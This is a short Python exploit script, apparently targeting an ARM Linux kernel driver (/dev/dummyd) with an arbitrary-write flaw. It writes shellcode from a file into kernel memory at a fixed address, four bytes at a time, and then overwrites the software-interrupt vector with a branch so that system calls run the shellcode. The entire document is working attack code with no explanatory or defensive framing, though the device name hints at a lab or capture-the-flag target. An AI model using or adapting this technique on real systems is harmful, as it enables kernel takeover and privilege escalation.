#!/usr/bin/env python

import struct
import telnetlib
import time

DEV_NAME = "/dev/dummyd"
SWI_VEC = 0xffff0008    # overwrite this
STATIC_LOC = 0xffff0020  # store shellcode here

BRANCH = 0xea000004     # opcode for b 0x18

sc = open("sc.bin", "r").read()

# write our shellcode
l = len(sc)
for i in range(0, l, 4):
    fp = open(DEV_NAME, "w")
    what = sc[i:i+4]
    where = struct.pack("<I", STATIC_LOC + i)
    buf = where + what
    fp.write(buf)
    fp.close()

# overwrite SWI vector
open(DEV_NAME, "w").write(struct.pack("<I", SWI_VEC) + struct.pack("<I", BRANCH))



